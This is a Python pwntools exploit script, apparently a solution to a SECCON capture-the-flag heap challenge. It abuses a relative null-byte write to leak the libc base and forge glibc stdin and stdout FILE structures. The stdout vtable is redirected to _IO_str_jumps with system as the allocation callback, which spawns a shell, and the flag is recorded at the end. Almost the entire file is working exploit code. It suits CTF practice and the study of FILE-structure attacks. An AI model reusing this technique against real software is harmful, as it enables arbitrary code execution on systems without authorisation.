from pwn import *
import time

def debug(func):
    from functools import wraps
    @wraps(func)
    def wrapper(*args, **kwargs):
        print("{}({}, {})".format(func.__name__, str(args), str(kwargs)))
        return func(*args, **kwargs)
    return wrapper


@debug
def alloc(alloc_size, read_size, data):
    io.sendlineafter(b'> ', b'1')
    io.sendlineafter(b'alloc size: ', b'%d' % alloc_size)
    io.sendlineafter(b'read size: ', b'%d' % read_size)
    io.sendafter(b'data: ', data)

@debug
def alloc_blind(alloc_size, read_size, data):
    io.sendline(b'1')
    payload = '%d\n%d\n%s\n' % (alloc_size, read_size, data)
    io.send(payload)
    data = io.recvuntil(b'1.')
    return data


MMAP_THREASHOLD = 0x40000

binpath = './chall'
elf = ELF(binpath)
libc = elf.libc


context.binary = elf
context.terminal = ['tmux', 'split-w', '-h']
# context.log_level = 'DEBUG'


gdbscript = '''
gef
# before calling babyheap
# b *0x555555554b92
# before overwriting NULL byte
pie breakpoint *0xaf9
'''
io = gdb.debug([binpath], gdbscript=gdbscript)
# io = process(binpath)
# io = remote('pwn-neko.chal.seccon.jp', 9003)

alloc(0x200000, 0x5ed750+0x10+1, b'A\n')  # _IO_2_1_stdout_.file._IO_read_end
data = alloc_blind(0x200000, 0x7ee750+0x20+1, b'A\n')  # _IO_2_1_stdout_.file._IO_write_base

libc.address = u64(data[0x20:0x28]) - 0x3eb780
print('libc = 0x{:x}'.format(libc.address))

alloc(0x200000, 0x9ee9f0+0x38+1, b'B\n')  # _IO_2_1_stdin_.file._IO_buf_base

fake_stdin = b''
fake_stdin += p64(0xfbad208b)
fake_stdin += p64(libc.address)  # _IO_2_1_stdin_.file._IO_read_ptr
fake_stdin += p64(0) * 5
fake_stdin += p64(libc.symbols['_IO_2_1_stdout_'])
fake_stdin += p64(libc.symbols['_IO_2_1_stdout_'] + 0x2000)
fake_stdin += b'\x00' * (0x84 - len(fake_stdin))

new_size = next(libc.search(b'/bin/sh'))
fake_stdout = b''
fake_stdout += p64(0xfbad2886)  # The flag can't be the original value 0xfbad2887. This has the flag _IO_USER_BUF set, which will make _IO_str_overflow return before executing _allocate_buffer (system)
fake_stdout += p64(0) * 4
fake_stdout += p64((new_size - 100) // 2)  # _IO_write_ptr
fake_stdout += p64(0) * 2
fake_stdout += p64((new_size - 100) // 2)
fake_stdout += p64(0) * 4
fake_stdout += p64(libc.symbols['_IO_2_1_stdin_'])  # chain
fake_stdout += p32(1)  # _fileno
fake_stdout += p32(0)  # _flags2
fake_stdout += p64(0xffffffffffffffff)  # _old_offset
fake_stdout += p16(0)  # _cur_column
fake_stdout += p8(0)  # _vtable_offset
fake_stdout += b'\n'  # _short_offset
fake_stdout += p32(0)  # padding
fake_stdout += p64(libc.address + 0x3ed8d0)  # _lock
fake_stdout += p64(0xffffffffffffffff)  # _offset
fake_stdout += p64(0)  # _codecvt
fake_stdout += p64(libc.address + 0x3eb8c0)  # _wide_data
fake_stdout += p64(0) * 3  # _freeres_list to _pad5
fake_stdout += p32(0xffffffff)
fake_stdout += b'\x00' * 0x14
fake_stdout += p64(libc.address + 0x3e8360)  # point vtable to _IO_str_jumps
fake_stdout += p64(libc.symbols['system'])  # _s.allocate_buffer
fake_stdout += p64(libc.symbols['_IO_2_1_stdout_'])  # _IO_2_1_stdout_ is originally placed here

payload = b''
payload += fake_stdin
payload += fake_stdout

io.sendlineafter(b'> ', payload)

io.interactive()



# SECCON{r3l4t1v3_nu11_wr1t3_pr1m1t1v3_2_sh3ll}
